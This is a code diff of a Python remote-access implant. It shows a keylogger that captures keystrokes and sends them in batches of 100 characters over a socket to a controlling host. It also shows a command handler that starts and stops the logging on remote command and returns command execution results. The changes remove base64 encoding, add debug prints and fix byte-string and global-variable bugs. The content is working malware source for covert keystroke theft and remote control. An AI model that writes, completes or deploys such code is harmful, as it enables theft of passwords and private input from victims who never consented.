@@ -76,8 +76,7 @@ def on_press(key):
 
     if len(keyBuffer) >= 100 and glbSock is not None: # Send keystrokes every 100 characters
       try:
-        encoded = base64.b64encode(keyBuffer.encode("utf-8")).decode("utf-8")
-        glbSock.send(f"KEYLOG|{encoded}".encode("utf-8"))
+        glbSock.send(f"KEYLOG|{keyBuffer}".encode("utf-8"))
         # Clear keyBuffer after sending
         keyBuffer = ""
       except:
@@ -89,7 +88,7 @@ def start_keylogger(sock):
   global glbSock, loggerIsRunning
   glbSock= sock
   loggerIsRunning = True
-
+  print("[*] Keylogger started")
   #Starts on_press
   with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
@@ -136,6 +135,11 @@ def execute_command(command, sock):
     except Exception as e:
       sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))
 
+###
+### File download and upload functions
+###
+
+
 
 ###
 ### Command Handler
@@ -156,17 +160,18 @@ def command_handler(sock):
       if not data: break
       
       cmd = data.decode("utf-8", errors="ignore").strip()
-      
+      print(f"[*] Received: {cmd}")
       
       # Keylogging command
       # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
       if cmd.startswith("KEYLOG_START"):
         keylog_thread = threading.Thread(target=start_keylogger, args = (sock,),daemon=True)
         keylog_thread.start()
-        sock.send("KEYLOG| STARTED")
+        sock.send(b"KEYLOG| STARTED")
       elif cmd == "KEYLOG_STOP":
+        global loggerIsRunning
         loggerIsRunning = False
-        sock.send("KEYLOG| STOPPED")
+        sock.send(b"KEYLOG| STOPPED")
 
       #Other functions to be implemented
       
